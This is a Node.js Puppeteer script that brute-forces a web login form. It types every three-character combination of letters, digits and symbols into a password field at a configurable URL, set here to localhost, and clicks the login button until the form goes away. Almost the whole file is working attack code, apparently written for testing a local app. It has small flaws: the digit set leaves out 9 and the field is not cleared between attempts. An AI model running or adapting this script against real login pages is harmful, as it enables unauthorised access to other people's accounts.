const puppeteer = require('puppeteer');
const MAJ = true
const SPECIALS = true
const NUMBERS = true
const MIN = 3
const MAX = 3
const URL = "http://localhost:3000/"
const IDINPUTPASSWORD = "standard-basic"
const IDINPUTUSERNAME = null
const USERNAME =null
const IDBUTTON = "btnLogin"

async function startBrowser(){
	let browser;
	try {
	    console.log("Opening the browser......");
	    browser = await puppeteer.launch({
	        headless: false,
	        args: ["--disable-setuid-sandbox"],
	        'ignoreHTTPSErrors': true
	    });
	} catch (err) {
	    console.log("Could not create a browser instance => : ", err);
	}
	return browser;
}

async function scrapeAll(browserInstance){
	let browser;
	try{
		browser = await browserInstance;
		await scraperObject.scraper(browser);
		
	}
	catch(err){
		console.log("Could not resolve the browser instance => ", err);
	}
}

const scraperObject = {
	url: URL,
	async scraper(browser){
		let page = await browser.newPage();
		console.log(`Navigating to ${this.url}...`);
		await page.goto(this.url);
		if(await page.$(`#${IDINPUTUSERNAME}`)) {
			await page.type(`#${IDINPUTUSERNAME}`, USERNAME)
		}
		await brute(page, MIN, MAX)
		await browser.close()
	}
}

function letters(MAJ = true, NUMBERS = true, SPECIALS = true) {
  const caps = [...Array(26)].map((val, i) => String.fromCharCode(i + 65));
  const numbers = NUMBERS ? [...Array(9)].map((val, i) => String.fromCharCode(i + 48)) : [];
  const capsMAJ = MAJ ? [...Array(26)].map((val, i) => String.fromCharCode(i + 65).toLowerCase()) : [];
  const selectedSpecialCharacters = SPECIALS ? ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '+', '-', '.', '~', '|', '<', '>', '=', '-', '_', '/', ':', ';', '?', '[', ']', '{', '}', '~'] : [];

  return [...caps, ...capsMAJ, ...numbers, ...selectedSpecialCharacters];
}

async function generateNoRecursion(page, len, chars) 
{
   
    var indices = [];
    for (var i = 0; i < len; ++i)
        indices.push(0);

    while (indices[0] < chars.length)
    {
        if(await page.$(`#${IDINPUTPASSWORD}`)) {
          
        var str = "";
        for (var i = 0; i < indices.length; ++i)
            str += chars[indices[i]];
            console.log(str);
        await page.type(`#${IDINPUTPASSWORD}`, str)
        await page.click(`#${IDBUTTON}`)

        indices[len-1]++;
        for (var i = len-1; i > 0 && indices[i] == chars.length; --i)
        {
            indices[i] = 0;
            indices[i-1]++;
        }
        } else {
            return;
        }

        
    }
}

async function brute(page, min, max)
{
    for (var l = min; l <= max; ++l)
        await generateNoRecursion(page, l, letters(MAJ, NUMBERS, SPECIALS));
}

let browserInstance = startBrowser();

scrapeAll(browserInstance)